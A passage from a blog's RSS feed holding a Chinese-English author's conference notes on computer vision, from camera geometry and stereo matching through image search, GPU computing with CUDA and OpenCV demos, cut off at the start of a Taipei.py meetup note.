&lt;li&gt;1960's: Interpretation of Synthetic Worlds  &lt;ul&gt;
&lt;li&gt;Larry Roberts (Father of Computer Vision)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1970's: Some progress on interpreting selected images  &lt;/li&gt;
&lt;li&gt;1980's: AI Winter ... back to basics  &lt;ul&gt;
&lt;li&gt;1984: Perceptual Organization and Visual Recognition, David Lowe  &lt;/li&gt;
&lt;li&gt;Blending  &lt;/li&gt;
&lt;li&gt;Shape from shading  &lt;ul&gt;
&lt;li&gt;用三角函數找出反光的角度建模  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Detection  &lt;/li&gt;
&lt;li&gt;From Science to Engineering  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1990's: structure, segmentation and face recognition  &lt;/li&gt;
&lt;li&gt;2000's: more object classes, computational photography, video processing  &lt;ul&gt;
&lt;li&gt;重新對焦的照相機  &lt;/li&gt;
&lt;li&gt;Texture Sythesis  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010's: Deep Learning is Back!!  &lt;ul&gt;
&lt;li&gt;AlexNet NIPS 2012  &lt;/li&gt;
&lt;li&gt;DeepFace CVPR 2014  &lt;/li&gt;
&lt;li&gt;DeepPose CVPR 2014  &lt;/li&gt;
&lt;li&gt;Show, Attend and Tell ICML 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Basic parts of Computer Vision&lt;/h2&gt;
&lt;h3&gt;Reference Books&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Multiple View Geometry in Computer Vision", Richard Hartley and Andrew Zisserman  &lt;ul&gt;
&lt;li&gt;A good book to get started on camera geometry  &lt;/li&gt;
&lt;li&gt;More math heavry but very old school  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://szeliski.org/Book/"&gt;"Computer Vision: Algorithms and Applications", Richard Szeliski&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;More balanced mix between math and application  &lt;/li&gt;
&lt;li&gt;Freely available online.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Image Formation and 2D Image Processing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Image formation  &lt;ul&gt;
&lt;li&gt;照相原理：散射會造成無法成像，所以透過針孔（作為 barrier），使其成像。  &lt;ul&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;光線不足，所以很暗  &lt;/li&gt;
&lt;li&gt;針孔太大的話，成像會變模糊，所以加上透鏡輔助。  &lt;ul&gt;
&lt;li&gt;Circle of Confusion  &lt;ul&gt;
&lt;li&gt;有散景表示你的鏡頭光圈夠大，代表你是有錢人。 XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Modeling Projection  &lt;ul&gt;
&lt;li&gt;The coordinate system  &lt;ul&gt;
&lt;li&gt;Homogeneous Coordinations  &lt;ul&gt;
&lt;li&gt;3D 轉 2D  &lt;/li&gt;
&lt;li&gt;4D 轉 3D  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Projection equations  &lt;/li&gt;
&lt;li&gt;Camera parameters  &lt;ul&gt;
&lt;li&gt;外部參數(extrinsics)  &lt;/li&gt;
&lt;li&gt;內部參數(intrinsics)  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ai.stanford.edu/~saumitro/projektiv/"&gt;http://ai.stanford.edu/~saumitro/projektiv/&lt;/a&gt; 可以透過這個網址來瞭解外部參數和內部參數實際上的影響  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distortion （扭曲）  &lt;ul&gt;
&lt;li&gt;Types  &lt;ul&gt;
&lt;li&gt;Pin Cushion Distortion（針包）  &lt;/li&gt;
&lt;li&gt;Barrel Distortion （木桶）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Camera Calibration （攝影機校正）  &lt;ul&gt;
&lt;li&gt;使用時機：把扭曲移除、改變照片的角度、要辨認轉了角度的物件畫面 (Low Level Projection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tilt-shift  &lt;ul&gt;
&lt;li&gt;Digital Color Images  &lt;ul&gt;
&lt;li&gt;Bayer Filter  &lt;ul&gt;
&lt;li&gt;人對綠色比較敏感，對藍色比較不敏感。  &lt;/li&gt;
&lt;li&gt;彩色的照片是 3 個黑白的 RGB 疊加起來  &lt;/li&gt;
&lt;li&gt;Many early algorithms use greyscale instead of color images, Why?  &lt;ul&gt;
&lt;li&gt;早期只有灰階照片  &lt;/li&gt;
&lt;li&gt;彩色會有偏差  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Filtering  &lt;ul&gt;
&lt;li&gt;Sliding Window  &lt;/li&gt;
&lt;li&gt;Sharpening filter (Unsharp Mask)  &lt;/li&gt;
&lt;li&gt;Vertical Edge  &lt;/li&gt;
&lt;li&gt;Horizontal Edge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Epipolar geomerty and stereo matching&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Recovering structure from a single view  &lt;ul&gt;
&lt;li&gt;Intrinsic ambiguity of the mapping from 3D to image (2D)  &lt;/li&gt;
&lt;li&gt;2D 是無法直接確定物體距離與深度的，必須用兩個眼睛來看，三角定位。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Epipolar_geometry"&gt;Epipolar geomerty&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Parallel Images Plane  &lt;/li&gt;
&lt;li&gt;Forward translation  &lt;/li&gt;
&lt;li&gt;Epipolar line  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=sKJeTaIEldM"&gt;The "Vertigo" Effect&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Epipolar Constraint (F)  &lt;ul&gt;
&lt;li&gt;Estimating F  &lt;ul&gt;
&lt;li&gt;The Eight-Point Algorithm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fundamental Matrix 很重要！  &lt;/li&gt;
&lt;li&gt;Rectification  &lt;ul&gt;
&lt;li&gt;Your basic stereo algorithm  &lt;/li&gt;
&lt;li&gt;Triangulation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth Map Results  &lt;/li&gt;
&lt;li&gt;Active stereo with structured light  &lt;ul&gt;
&lt;li&gt;Data Acquisition  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Structure from motion and tracking&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Finding Path Through the World's Photos  &lt;/li&gt;
&lt;li&gt;Pose Estimation  &lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;ul&gt;
&lt;li&gt;Tracking  &lt;ul&gt;
&lt;li&gt;找特徵點去追蹤，然後解出結構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Stitching and computational photography&lt;/h3&gt;
&lt;p&gt;如何把一堆照片合起來變成一張大照片  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Image Mosaics  &lt;/li&gt;
&lt;li&gt;Recognizing Panormas  &lt;/li&gt;
&lt;li&gt;De-Ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based de-ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based compositing  &lt;/li&gt;
&lt;li&gt;Photomontage  &lt;/li&gt;
&lt;li&gt;可以把好幾張裏面有不同人閉眼的照片合成一張沒有人閉眼的照片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Poisson Image Editing  &lt;ul&gt;
&lt;li&gt;Possion Equation: 微分、微分、再積分  &lt;/li&gt;
&lt;li&gt;照片合成特效  &lt;/li&gt;
&lt;li&gt;Seamless Poisson cloning  &lt;/li&gt;
&lt;li&gt;Face Cloning  &lt;/li&gt;
&lt;li&gt;Texture Swapping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Mobile Panorama  &lt;/li&gt;
&lt;li&gt;High Dynamic Range Imaging (HDR)  &lt;ul&gt;
&lt;li&gt;The real word is high dynamic range  &lt;ul&gt;
&lt;li&gt;Typical cameras have limited dynamic range  &lt;ul&gt;
&lt;li&gt;Solution: Merge multiple exposures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Varying Exposure  &lt;/li&gt;
&lt;li&gt;Tone Mapping  &lt;/li&gt;
&lt;li&gt;Simple Global Operator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Local Adjustment of Tonal Values  &lt;ul&gt;
&lt;li&gt;Tonal （色調） Manipulation  &lt;/li&gt;
&lt;li&gt;Constraint Propagation  &lt;/li&gt;
&lt;li&gt;Touch-Tone: Point-and-Swipe Image Editing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Visual Recognition and Query&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1989  &lt;ul&gt;
&lt;li&gt;MNIST, Backpropagation applied to handwritten zip code recognition  &lt;/li&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1998, Neural Network-Based Face Detection  &lt;/li&gt;
&lt;li&gt;1999, SIFT (Scale Invariant Feature Transform)  &lt;ul&gt;
&lt;li&gt;Object Recognition from Local Scale-Invariant Features, Lowe, ICCV 1999.  &lt;/li&gt;
&lt;li&gt;No more sliding windows (interest points)  &lt;/li&gt;
&lt;li&gt;Better features (use more computation)  &lt;/li&gt;
&lt;li&gt;找出來的特徵點會是一個球，而不是邊邊角角。  &lt;/li&gt;
&lt;li&gt;Better Descriptor  &lt;ul&gt;
&lt;li&gt;Image gradients =&amp;gt; Keypoint descriptor  &lt;/li&gt;
&lt;li&gt;Truncated normalization (globally)  &lt;/li&gt;
&lt;li&gt;高維度的球  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What worked  &lt;ul&gt;
&lt;li&gt;Object instance recognition  &lt;/li&gt;
&lt;li&gt;Panaroma  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認東西  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2001, Rapid Object Detection using a Boosted Cascade of Simple Features, Viola and Jones  &lt;ul&gt;
&lt;li&gt;Why did it work?  &lt;ul&gt;
&lt;li&gt;Simple Features (Haar wavelets)  &lt;/li&gt;
&lt;li&gt;假設光線都是從上打下來，直接去認眼睛和鼻子的陰影，覺得有可能的保留，沒可能的就丟掉，所以速度很快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why did it fail?  &lt;ul&gt;
&lt;li&gt;側面就無法 work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2003, Constellatioin model (redux) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Object Class Recognition by Unsupervised Scale-Invariant Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2005, HOG (Histograms of oriented gradients) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Normalize locally not globally  &lt;/li&gt;
&lt;li&gt;Why worked?  &lt;ul&gt;
&lt;li&gt;Hard negative mining  &lt;/li&gt;
&lt;li&gt;Computers are fast enought  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認出運動中的人，必須要站著。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2007, Pascal VOC  &lt;ul&gt;
&lt;li&gt;The PASCAL Visual Object Classes (VOC) Challenge  &lt;/li&gt;
&lt;li&gt;只有 20 個分類  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2008, DPM (Deformable parts model)  &lt;ul&gt;
&lt;li&gt;Object Detection with Discriminatively Trained Part Based Model  &lt;/li&gt;
&lt;li&gt;Star-structure  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2009, Caltech Pedestrian  &lt;/li&gt;
&lt;li&gt;2009, ImageNet  &lt;ul&gt;
&lt;li&gt;ImageNet, A Large-Scale Hierarchical Image Database  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010, SUN  &lt;ul&gt;
&lt;li&gt;SUN Database: Large-scale Scene Recognition from Abbey to Zoo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mscoco.org"&gt;MS COCO&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;over 77,000 worker hours (8+ years)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2012 DNNs  &lt;ul&gt;
&lt;li&gt;GPUs + Data  &lt;/li&gt;
&lt;li&gt;Classification vs Deteciton  &lt;ul&gt;
&lt;li&gt;Detection need to know the position of the target object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CNN, RNN  &lt;/li&gt;
&lt;li&gt;Why it fails  &lt;ul&gt;
&lt;li&gt;找不到位置的話就很難去判斷  &lt;/li&gt;
&lt;li&gt;Neural Networks are easily fooled  &lt;ul&gt;
&lt;li&gt;會把看起來完全不相關的雜訊誤判成某些物件  &lt;ul&gt;
&lt;li&gt;Neural Networks are easily fooled: High Confidence Predictions for Unrecognizable Images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PANDA: Pose Aligned Networks for Deep Attribute Modeling  &lt;/li&gt;
&lt;li&gt;DeepFace: closing the gap to  human-Level performance in fac verification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Additional Challenges  &lt;ul&gt;
&lt;li&gt;Detecgtion in context (with common sense)  &lt;ul&gt;
&lt;li&gt;加入一些常識的判斷，例如：人在普通情況下不可能在天上飛之類的等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model awareness  &lt;/li&gt;
&lt;li&gt;Training time (when dataset is incrementally updated)  &lt;ul&gt;
&lt;li&gt;每個公司都用大量的電腦去運算，不僅耗時，也蠻浪費電的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More science?  &lt;ul&gt;
&lt;li&gt;目前比較像是大量嘗試去找出方法，不太有系統且有科學性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【索引】多媒體檢索&lt;/h1&gt;
&lt;h2&gt;Search By Image Examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Still very much an open problem  &lt;/li&gt;
&lt;li&gt;Most commercial applications use a mixture of algorithms  &lt;ul&gt;
&lt;li&gt;沒有一種演算法可以完全解決這個問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Goggles in action  &lt;ul&gt;
&lt;li&gt;Text =&amp;gt; OCR  &lt;/li&gt;
&lt;li&gt;Landmarks, Books, Artwork, Wine, Logos =&amp;gt; SIFT  &lt;/li&gt;
&lt;li&gt;Contact Info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TinEye  &lt;ul&gt;
&lt;li&gt;以圖找圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instance Recognition  &lt;/li&gt;
&lt;li&gt;Search Structure  &lt;/li&gt;
&lt;li&gt;Possible Solutions  &lt;ul&gt;
&lt;li&gt;Find approximate words  &lt;ul&gt;
&lt;li&gt;Approximate nearest neighbour (ANN)  &lt;/li&gt;
&lt;li&gt;維度比較高，所以速度比較慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Find lower dimensional spae to split the data  &lt;ul&gt;
&lt;li&gt;找 2D 的的資料，雖然沒那麼準確，但速度會比較快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scalable Recognition with a Vocabulary Tree  &lt;ul&gt;
&lt;li&gt;先拿一張圖找 Feature  &lt;/li&gt;
&lt;li&gt;找出來後丟到高維度的空間（約兩百多維)  &lt;/li&gt;
&lt;li&gt;會有很多不同的點  &lt;/li&gt;
&lt;li&gt;用定義好的向量距離，用 &lt;a href="https://en.wikipedia.org/wiki/K-means_clustering"&gt;K-means&lt;/a&gt; 做分群  &lt;/li&gt;
&lt;li&gt;遞迴做下去就可以得到愈多種類的分群結果  &lt;/li&gt;
&lt;li&gt;最後再把不需要的東西去掉，得到 Vocabulary Tree  &lt;/li&gt;
&lt;li&gt;得到 Vocabulary Tree 後，把每個 Feature 丟進去，會知道在 Vocabulary Tree 的哪個節點  &lt;/li&gt;
&lt;li&gt;如果該 Feature 的結果只指向一張圖的話，就很有可能是這張圖。  &lt;/li&gt;
&lt;li&gt;但當某個節點有關的圖愈多的話，entropy 愈高，結果就愈難判斷。  &lt;/li&gt;
&lt;li&gt;這時候可以使用 &lt;a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"&gt;tf-idf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【加速】圖形處理器與深度學習 (GPU and Computation)&lt;/h1&gt;
&lt;h2&gt;Parallel Processing and GPU&lt;/h2&gt;
&lt;h3&gt;Parallel Computing Goals&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;To slove your problem in less time  &lt;ul&gt;
&lt;li&gt;平行化去處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In order to parallelize a problem  &lt;ul&gt;
&lt;li&gt;要去看哪邊有關聯性，並確定處理這些關聯性對演算法的影響。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Types of Parallelism&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Multiple Programs  &lt;ul&gt;
&lt;li&gt;Multi-tasking  &lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Single Program  &lt;ul&gt;
&lt;li&gt;Instruction-levl parallelism  &lt;ul&gt;
&lt;li&gt;Multiple instructions in a serial program get excuted simultaneously  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data-level parallelism  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;S&lt;/strong&gt;ingle &lt;strong&gt;I&lt;/strong&gt;nstruction, &lt;strong&gt;M&lt;/strong&gt;ultiple &lt;strong&gt;D&lt;/strong&gt;ata processing model (SIMD)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Amdahl's Law  &lt;ul&gt;
&lt;li&gt;Named after computer architect Gene Amdahl  &lt;/li&gt;
&lt;li&gt;Speedup of a parallel computer is limited by the amount of serial work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resource Management  &lt;ul&gt;
&lt;li&gt;哲學家晚餐問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPU Applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Real-time rendering. e.g. Game  &lt;/li&gt;
&lt;li&gt;Movie Effect  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPUs Today&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GPUs are becoming more programmable  &lt;/li&gt;
&lt;li&gt;GPUs now support 32/64 bit floating points numbers  &lt;/li&gt;
&lt;li&gt;GPUs have higher memory bandwidth than CPUs  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;NVIDIA CUDA&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Compute Unified Device Architecture  &lt;/li&gt;
&lt;li&gt;CUDA Workflow  &lt;ul&gt;
&lt;li&gt;Get a CUDA-enabled GPU  &lt;/li&gt;
&lt;li&gt;Write C/C++ like code (*.cu)  &lt;/li&gt;
&lt;li&gt;Compile with CUDA compiler (nvcc)  &lt;ul&gt;
&lt;li&gt;Generated PTX code ("Parallel Thread Execution")  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Applications auto-magically run on GPUs  &lt;ul&gt;
&lt;li&gt;Many many parallel threads  &lt;/li&gt;
&lt;li&gt;CUDA driver translate PTX code into hardware.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CUDA Overview  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;之前學 CUDA 時收集的一份不錯的 CUDA 教學系列文：&lt;a href="/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Frameworks and Libraries&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;MATLAB  &lt;/li&gt;
&lt;li&gt;BLAS Library (Basic Linear Algebra Subprograms)  &lt;ul&gt;
&lt;li&gt;和 Fortran 同年代的產物  &lt;/li&gt;
&lt;li&gt;Processor vendors implement their BLAS library  &lt;ul&gt;
&lt;li&gt;e.g., Intel MKL (Math Kernel Library)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;cuBLAS - CUDA version, very fast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA Thrust Library  &lt;ul&gt;
&lt;li&gt;A little like C++ STL library for CUDA  &lt;/li&gt;
&lt;li&gt;Very few lines of code for vector manipulation  &lt;/li&gt;
&lt;li&gt;Fast implementation of parallel primitives  &lt;ul&gt;
&lt;li&gt;reduce  &lt;ul&gt;
&lt;li&gt;mapreduce  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scan  &lt;/li&gt;
&lt;li&gt;sort  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA cuDNN  &lt;ul&gt;
&lt;li&gt;Deep Neural Network Library for CUDA  &lt;/li&gt;
&lt;li&gt;TensorFlow, Caffe, Microsoft CNTK  &lt;/li&gt;
&lt;li&gt;Deep Learning Getting Started Advises  &lt;ul&gt;
&lt;li&gt;Borrow (steal if you must) a modern GPU  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="http://caffe.berkeleyvision.org"&gt;Caffe&lt;/a&gt; for your deep learning projects  &lt;/li&gt;
&lt;li&gt;Browse through the Caffe Model Zoo and try out the existing (pre-trained) models (AlexNet, R-CNN and GooLeNet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;電腦視覺之實作演示&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Introduct OpenCV by the official tutorials  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Core functionality  &lt;/li&gt;
&lt;li&gt;Image processing  &lt;/li&gt;
&lt;li&gt;Demos  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python, OpenCV, Numpy  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Canny Edge Detection  &lt;ol&gt;
&lt;li&gt;Detect unique edges  &lt;ul&gt;
&lt;li&gt;不管是 strong edge 或 weak edge 在經過微分後都會產生一個 peak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Voting (Use 2 threshold)  &lt;ul&gt;
&lt;li&gt;Strong edge: Always accept.  &lt;/li&gt;
&lt;li&gt;Weak edge: Accept when connected.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是很多後續演算法的基礎  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Histogram  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;OpenCV QR Drive  &lt;ul&gt;
&lt;li&gt;QR code Marker Detection  &lt;ul&gt;
&lt;li&gt;1:1:3:1:1 black-white markers at the coners  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to detect 11311?  &lt;ul&gt;
&lt;li&gt;Only need to use raster scan  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="https://en.wikipedia.org/wiki/Otsu%27s_method"&gt;Otsu algorithm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Thresholding: leave only white and black  &lt;/li&gt;
&lt;li&gt;A binarization algorithm that minimize the weighted intra-class variance algorighm for bimodal distributioin.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Detect the most bright points  &lt;ol&gt;
&lt;li&gt;Dilate  &lt;/li&gt;
&lt;li&gt;Equality check  &lt;/li&gt;
&lt;li&gt;Threshold  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Dilation and thresholding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make a little PiBorg which will chase the $1,000 NTD bill.  &lt;ul&gt;
&lt;li&gt;The PiBorg (RPi + Motor) aka &lt;a href="https://www.youtube.com/watch?v=s3Qdsn401H0"&gt;DoodleBorg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift (WACV 98)  &lt;/li&gt;
&lt;li&gt;Meanshift  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.opencv.org/3.1.0/db/df8/tutorial_py_meanshift.html"&gt;OpenCV: Meanshift and Camshift&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift 比 Meanshift 多了一個 scale 的選項  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;Basic OpenCV functionalities  &lt;/li&gt;
&lt;li&gt;OpenCV and image processing  &lt;/li&gt;
&lt;li&gt;OpenCV and detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sun, 24 Apr 2016 14:43:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-04-23:posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/</guid><category>Data Science</category><category>Deep Learning</category><category>Conf</category></item><item><title>Taipei.py 20160421 Meetup Note</title><link>https://blog.m157q.tw/posts/2016/04/21/taipei-py-20160421-meetup-note/</link><description>&lt;p&gt;&lt;a href="http://www.meetup.com/Taipei-py/events/230083921/"&gt;http://www.meetup.com/Taipei-py/events/230083921/&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Topic 1: Neural Art and Neural Doodle in Python&lt;br /&gt;
Topic 2: Experience from KKBOX  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Neural Art and Neural Doodle in Python&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-art-english-version"&gt;Neural Art&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-doodle"&gt;Neural Doodle&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-art-english-version"&gt;Neural Art&lt;/a&gt;  &lt;ul&gt;
